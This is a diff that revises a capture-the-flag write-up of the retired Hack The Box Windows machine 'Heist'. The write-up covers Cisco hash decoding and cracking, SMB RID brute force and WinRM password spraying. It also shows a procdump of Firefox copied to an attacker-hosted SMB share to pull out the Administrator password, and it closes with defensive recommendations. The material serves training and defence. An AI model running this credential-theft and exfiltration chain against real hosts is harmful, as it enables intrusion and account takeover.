@@ -10,139 +10,277 @@ tags:
   - windows
   - credential-reuse
   - process-dump
+objective: "Escalate from guest portal access to local Administrator via leaked network-device credentials and browser process memory."
+tools:
+  - nmap
+  - curl
+  - passlib
+  - john
+  - netexec
+  - procdump
+  - smbserver.py
+  - strings
+skill: "Credential recovery and reuse across network, SMB, and WinRM services; browser process memory analysis"
+outcome: "WinRM command execution as local Administrator after recovering the password from Firefox process memory"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Windows host running IIS 10.0 with SMB and WinRM |
+| Starting position | Unauthenticated network access with a guest-accessible portal |
+| Objective | Escalate from guest portal access to local Administrator |
+| Outcome | WinRM command execution as local Administrator |
 
 ## Summary
 
-Heist is a retired Easy Windows machine on Hack The Box. A guest-accessible support portal exposes a Cisco router configuration file containing reversible type 7 and cracked type 5 password hashes. Recovered credentials grant SMB access as `<LOW_PRIVILEGE_USER>`, enabling RID brute force to discover additional local accounts. Password spraying yields a WinRM shell as `<WINRM_USER>`. A `todo.txt` note and running Firefox process point to an active browser session; dumping Firefox process memory reveals the Administrator password in plaintext form from a submitted login URL. WinRM access as `Administrator` completes the machine. All IPs and credential values below are replaced with role-based placeholders.
+Heist is a retired Easy Hack The Box Windows machine that reaches administrative control without a privilege-escalation exploit: a guest-accessible support portal leaks a Cisco router configuration, and the recovered credentials carry the chain through SMB, WinRM, and browser process memory. Target addresses, hostnames, accounts, and credential values are replaced with role-based placeholders; command syntax and technique order are preserved.
+
+**Attack path:** **Guest support portal → leaked Cisco configuration → decoded type 7 and cracked type 5 credentials → SMB access as `<LOW_PRIVILEGE_USER>` → RID brute force → password spray → WinRM as `<WINRM_USER>` → Firefox process dump → Administrator credential from browser memory → WinRM as Administrator**
 
 ## Context and Objective
 
-The target presents an IIS web server with a support ticket portal, SMB on port 445, and WinRM on port 5985. Guest access to the portal is available without authentication. The objective is to identify an attack path from guest-level portal access to full Administrator compromise on the Windows host.
+The machine exposes a Microsoft IIS support portal on port 80, SMB on port 445, and WinRM on port 5985. The portal offers a guest login and an issues tracker, where an attachment links a Cisco router configuration file. The objective is to trace an attack path from guest-level portal access to full administrative control of the host.
 
 ## Approach and Evidence
 
-### Stage 1 — Guest Portal Access and Cisco Configuration Extraction
+### 1. Service Enumeration
 
-Guest login to the support portal redirects to an issues tracker page. An attachment link provides direct access to a Cisco router configuration file without further authentication.
+Observation: a service scan exposes an IIS web application, SMB, and WinRM.
+
+```bash
+nmap -Pn -sC -sV -oA <SCAN_PREFIX> <TARGET_IP>
+```
+
+Truncated scan output:
 
 ```text
-GET /login.php?guest=true → 302 → issues.php
-GET /attachments/config.txt → 200 (Cisco config contents)
+Nmap scan report for <TARGET_HOST> (<TARGET_IP>)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
 ```
 
-The configuration contains three credential artifacts: a Cisco type 5 MD5-crypt enable secret, and two Cisco type 7 reversible passwords for accounts `rout3r` and `admin`.
+Significance: the support portal is the only interactive application surface, while SMB and WinRM become useful once credentials are recovered.
 
-### Stage 2 — Cisco Credential Recovery
+Result: a Windows host exposing an IIS support portal, SMB, and WinRM.
 
-Cisco type 7 passwords use a reversible algorithm. Both values were decoded to plaintext equivalents.
+### 2. Guest Portal Access and Cisco Configuration Extraction
+
+Observation: guest login redirects to the issues tracker, whose attachment is readable without any further authentication.
 
 ```bash
-python3 -c "from passlib.hash import cisco_type7; print(cisco_type7.decode('<TYPE7_HASH>'))"
-```
-
-The type 5 enable secret was cracked with a dictionary attack using John the Ripper with the md5crypt format, yielding a third credential. This produced three recovered passwords mapped to the accounts `rout3r`, `admin`, and the enable secret.
-
-### Stage 3 — SMB Access and RID Brute Force
-
-Testing the cracked enable secret against the visible issue author username `<LOW_PRIVILEGE_USER>` produced a valid SMB authentication.
-
-```bash
-nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<RECOVERED_PASSWORD>'
-```
-
-```text
-[+] <TARGET_DOMAIN>\<LOW_PRIVILEGE_USER>:<RECOVERED_PASSWORD>
-```
-
-Authenticated SMB access enabled RID brute force enumeration, revealing additional local user accounts including `<WINRM_USER>` and `<ADDITIONAL_USER>`.
-
-```bash
-nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<RECOVERED_PASSWORD>' --rid-brute
+curl -i 'http://<TARGET_IP>/login.php?guest=true'
 ```
 
 ```text
-<RID>: <TARGET_DOMAIN>\<LOW_PRIVILEGE_USER> (SidTypeUser)
-<RID>: <TARGET_DOMAIN>\<SUPPORT_USER> (SidTypeUser)
-<RID>: <TARGET_DOMAIN>\<WINRM_USER> (SidTypeUser)
-<RID>: <TARGET_DOMAIN>\<ADDITIONAL_USER> (SidTypeUser)
+HTTP/1.1 302 Found
+Location: issues.php
+Set-Cookie: PHPSESSID=...
 ```
 
-### Stage 4 — Password Spray to WinRM
+```bash
+curl http://<TARGET_IP>/attachments/config.txt
+```
 
-Spraying the three recovered passwords against the discovered usernames over WinRM produced a valid login as `<WINRM_USER>`.
+```text
+version 12.2
+service password-encryption
+hostname <ROUTER_HOSTNAME>
+
+enable secret 5 <TYPE5_HASH>
+
+username <ROUTER_USER> password 7 <TYPE7_HASH_ROUTER>
+username <ROUTER_ADMIN> privilege 15 password 7 <TYPE7_HASH_ADMIN>
+```
+
+Significance: the portal leaks a network-device configuration containing three reusable credential artifacts—an MD5-crypt (type 5) enable secret and two reversible (type 7) account passwords.
+
+Result: guest access alone exposes the full router configuration, with no authenticated portal session required.
+
+### 3. Cisco Credential Recovery
+
+Observation: the type 7 values are reversible, while the type 5 enable secret is a fast MD5-crypt cracking target.
+
+```bash
+python3 - <<'PY'
+from passlib.hash import cisco_type7
+for enc in ["<TYPE7_HASH_ROUTER>", "<TYPE7_HASH_ADMIN>"]:
+    print(f"{enc} -> {cisco_type7.decode(enc)}")
+PY
+```
+
+```text
+<TYPE7_HASH_ROUTER> -> <ROUTER_USER_PASSWORD>
+<TYPE7_HASH_ADMIN> -> <ROUTER_ADMIN_PASSWORD>
+```
+
+```bash
+john --wordlist=<WORDLIST> --format=md5crypt <HASH_FILE>
+```
+
+```text
+<ENABLE_SECRET>    (?)
+```
+
+Significance: the type 7 passwords recover instantly by decoding, and the enable secret falls to a dictionary attack on a common wordlist—no cryptographic weakness in MD5 is needed.
+
+Result: three credentials are recovered—`<ROUTER_USER_PASSWORD>` for `<ROUTER_USER>`, `<ROUTER_ADMIN_PASSWORD>` for `<ROUTER_ADMIN>`, and `<ENABLE_SECRET>` from the enable secret.
+
+### 4. SMB Authentication and RID Brute Force
+
+Observation: the recovered enable secret authenticates over SMB for the issue author's username, which is visible in the portal.
+
+```bash
+nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<ENABLE_SECRET>'
+```
+
+```text
+SMB  <TARGET_IP>  445  <TARGET_HOST>  [+] <TARGET_HOST>\<LOW_PRIVILEGE_USER>:<ENABLE_SECRET>
+```
+
+Significance: any valid SMB account unlocks RID brute-force enumeration of the local SAM.
+
+```bash
+nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<ENABLE_SECRET>' --rid-brute
+```
+
+```text
+<RID_1>: <TARGET_HOST>\Administrator (SidTypeUser)
+<RID_2>: <TARGET_HOST>\Guest (SidTypeUser)
+<RID_3>: <TARGET_HOST>\DefaultAccount (SidTypeUser)
+<RID_4>: <TARGET_HOST>\WDAGUtilityAccount (SidTypeUser)
+<RID_5>: <TARGET_HOST>\<LOW_PRIVILEGE_USER> (SidTypeUser)
+<RID_6>: <TARGET_HOST>\<SUPPORT_USER> (SidTypeUser)
+<RID_7>: <TARGET_HOST>\<WINRM_USER> (SidTypeUser)
+<RID_8>: <TARGET_HOST>\<ADDITIONAL_USER> (SidTypeUser)
+```
+
+Result: authenticated SMB access is obtained, and the local user list—including `<SUPPORT_USER>`, `<WINRM_USER>`, and `<ADDITIONAL_USER>`—is enumerated.
+
+### 5. Password Spray to WinRM
+
+Observation: the three recovered passwords are sprayed against the enumerated usernames over WinRM.
 
 ```bash
 nxc winrm <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success
 ```
 
 ```text
-[+] <TARGET_DOMAIN>\<WINRM_USER>:<RECOVERED_PASSWORD> (Pwn3d!)
+WINRM  <TARGET_IP>  5985  <TARGET_HOST>  [+] <TARGET_HOST>\<WINRM_USER>:<ROUTER_ADMIN_PASSWORD> (Pwn3d!)
 ```
 
-The `<WINRM_USER>` account had a WinRM login shell, providing user-level access to the host.
+Significance: the same value recovered from the router `<ROUTER_ADMIN>` account is reused for the Windows account `<WINRM_USER>`, so the leaked secret crosses from the network device into a host login. The `(Pwn3d!)` marker shows the credentials permit command execution over WinRM.
 
-### Stage 5 — Local Enumeration and Firefox Process Targeting
+Result: WinRM command execution is obtained as `<WINRM_USER>`.
 
-Post-exploitation enumeration as `<WINRM_USER>` revealed a `todo.txt` on the desktop indicating the user actively monitors the support portal. A process listing showed multiple Firefox instances running under the `<WINRM_USER>` user context.
+### 6. Local Enumeration and Firefox Process Targeting
+
+Observation: a desktop todo note shows the user monitors the portal, and a process listing shows Firefox running in the same user context.
 
 ```bash
-nxc winrm <TARGET_IP> -u <WINRM_USER> -p '<WINRM_PASSWORD>' -x 'Get-Process | Select-Object Id,ProcessName,Path | Format-Table -AutoSize'
+nxc winrm <TARGET_IP> -u <WINRM_USER> -p '<ROUTER_ADMIN_PASSWORD>' -x 'type C:\Users\<WINRM_USER>\Desktop\todo.txt'
+```
+
+```text
+Stuff to-do:
+1. Keep checking the issues list.
+2. Fix the router config.
+
+Done:
+1. Restricted access for guest user.
+```
+
+```bash
+nxc winrm <TARGET_IP> -u <WINRM_USER> -p '<ROUTER_ADMIN_PASSWORD>' -x 'Get-Process | Select-Object Id,ProcessName,Path | Format-Table -AutoSize'
 ```
 
 ```text
 Id    ProcessName  Path
+
 6368  firefox      C:\Program Files\Mozilla Firefox\firefox.exe
 6476  firefox      C:\Program Files\Mozilla Firefox\firefox.exe
 ```
 
-The combination of the todo note and running browser process indicated a high likelihood of stored credentials in browser memory.
+Significance: a browser session actively used against the portal is a likely home for a submitted credential, so browser memory becomes the most direct target rather than a blind process dump.
 
-### Stage 6 — Firefox Process Dump and Administrator Credential Extraction
+Result: Firefox processes running under `<WINRM_USER>` are identified as the likely credential source.
 
-`procdump` was used to capture a full memory dump of a Firefox process. The dump was transferred to the attacker host via an SMB share.
+### 7. Firefox Process Dump and Administrator Credential Extraction
+
+Observation: a full dump of the Firefox process is taken and searched for the portal's login form parameter.
 
 ```bash
 procdump.exe -ma firefox.exe firefox.dmp
 ```
 
-Searching the dump for the login form parameter `login_password` revealed a plaintext URL containing the Administrator password.
+```text
+Dump 1 initiated: firefox.exe -> firefox.dmp
+```
+
+The dump is moved to the attacking host over an SMB share, served with `smbserver.py`, and searched on disk.
+
+```bash
+smbserver.py -smb2support -username <SMB_USER> -password <SMB_PASSWORD> share <SHARE_DIR>
+```
+
+```cmd
+net use Z: \\<ATTACKER_HOST>\share /user:<SMB_USER> <SMB_PASSWORD>
+copy firefox.dmp Z:\
+```
 
 ```bash
 strings -el firefox.dmp | grep -i 'login_password'
 ```
 
 ```text
-<TARGET_HOST>/login.php?login_username=<ADMIN_USER>@<TARGET_DOMAIN>&login_password=<ADMIN_PASSWORD>&login=
+localhost/login.php?login_username=<ADMIN_USER>@<TARGET_DOMAIN>&login_password=<ADMIN_PASSWORD>&login=
 ```
 
-The extracted credential provided valid WinRM access as `Administrator`, completing full privilege escalation.
+Significance: the submitted login URL persists in process memory as cleartext, exposing the password without guessing or brute force.
+
+Result: the recovered credential authenticates as the Windows Administrator over WinRM.
 
 ```bash
 nxc winrm <TARGET_IP> -u administrator -p '<ADMIN_PASSWORD>'
 ```
 
 ```text
-[+] <TARGET_DOMAIN>\administrator:<ADMIN_PASSWORD> (Pwn3d!)
+WINRM  <TARGET_IP>  5985  <TARGET_HOST>  [+] <TARGET_HOST>\administrator:<ADMIN_PASSWORD> (Pwn3d!)
 ```
 
 ## Challenges and Decisions
 
-The Cisco type 7 passwords were immediately reversible, requiring no external cracking resources. The enable secret required dictionary-based cracking but was fast against common wordlists. The critical decision was to pivot from web portal findings to SMB enumeration and then password spray, since the leaked credentials did not work against the web login form directly. Identifying the Firefox process as a credential source required correlating the todo.txt hint with the process listing; a blind process dump without that context would have been less targeted.
+- The recovered router credentials did not authenticate against the web login form directly, so the path pivoted to SMB and WinRM rather than the portal itself.
+- Only the issue author's username was visible initially, so the RID brute-force result was needed to supply usernames for the password spray; the spray then revealed the reuse on `<WINRM_USER>`.
+- Correlating the todo note with the process listing made the dump targeted: both pointed to active browser use, so dumping a single `firefox.exe` process was the most direct route to a stored credential.
 
 ## Outcome
 
-The evidence establishes a complete unauthenticated-to-Administrator attack chain through credential leakage and process memory exposure. The path relied on a misconfigured guest portal exposing network device credentials, password reuse across web and Windows accounts, and a privileged user storing credentials in an active browser session. No kernel exploit or unpatched software vulnerability was required.
+The evidence establishes unauthenticated-to-Administrator access: secrets leaked from a guest-reachable device configuration were reused across SMB and WinRM, and the final Administrator credential was validated only over WinRM. The final escalation did not require a kernel exploit.
 
 ## Lessons and Recommendations
 
-- Cisco type 7 passwords are reversible by design and should be treated as plaintext-equivalent. Migrate to type 8 (PBKDF2-SHA256) or type 9 (scrypt) password hashing.
-- Sensitive network device configurations must not be exposed through guest-accessible portals or support ticket attachments. Implement access controls and audit attachment exposure.
-- Password reuse across infrastructure devices and Windows domain accounts creates lateral movement paths. Use unique credentials for each system tier.
-- RID brute force enumeration with any valid SMB account reveals the full local user list. Restrict low-privileged users from performing SAM enumeration where possible.
-- Browser process memory may contain plaintext credentials from form submissions. Avoid logging into administrative interfaces from shared or monitored user sessions; consider credential isolation and browser hardening.
-- Monitoring for unusual process dump activity (e.g., `procdump` targeting browser processes) can detect this class of credential theft at the endpoint level.
+The actions below are recommendations; none was tested in the lab.
+
+1. **Guest-accessible device configuration.** An unauthenticated guest could retrieve a router configuration holding three credential artifacts. *Preventive:* require authentication and authorization on issue attachments and keep device configurations out of web-accessible storage. *Detective:* alert on access to configuration or export files from guest sessions.
+2. **Reversible and weak secrets on network devices.** Cisco type 7 values decode directly and the type 5 MD5-crypt enable secret fell to a dictionary attack. *Preventive:* migrate to non-reversible password types (type 8 PBKDF2-SHA256 or type 9 scrypt) and remove type 5 and type 7 secrets.
+3. **Credential reuse across infrastructure and Windows accounts.** The router `<ROUTER_ADMIN>` password also authenticated `<WINRM_USER>`, and the cracked enable secret authenticated SMB. *Preventive:* issue unique credentials per system tier and rotate shared secrets. *Detective:* monitor for one secret used against multiple services.
+4. **Unauthenticated RID enumeration.** Any valid SMB account enumerated every local user, enabling a targeted spray. *Preventive/detective:* restrict low-privileged local SAM enumeration and monitor for RID brute-force patterns.
+5. **Credentials retained in browser memory.** A submitted portal login URL remained in Firefox memory as plaintext, yielding the Administrator password. *Preventive:* avoid signing into privileged interfaces from shared or monitored sessions and clear sensitive browser state. *Detective:* monitor for process dumps of browser processes, the `procdump` pattern used here.
 
 ## References
 
-- Hack The Box — [Heist](https://app.hackthebox.com/machines/Heist) (retired Windows machine)
+- [Hack The Box — Heist](https://app.hackthebox.com/machines/Heist) (retired Windows machine)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and WinRM authentication, RID brute force, and command execution)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [passlib — Cisco type 7 hash](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.cisco_type7.html) (reversible Cisco password decoding)
+- [John the Ripper](https://github.com/openwall/john) (MD5-crypt dictionary cracking)
+- [Sysinternals ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) (browser process memory capture)
+- [curl](https://curl.se/docs/manpage.html) (HTTP requests against the portal)
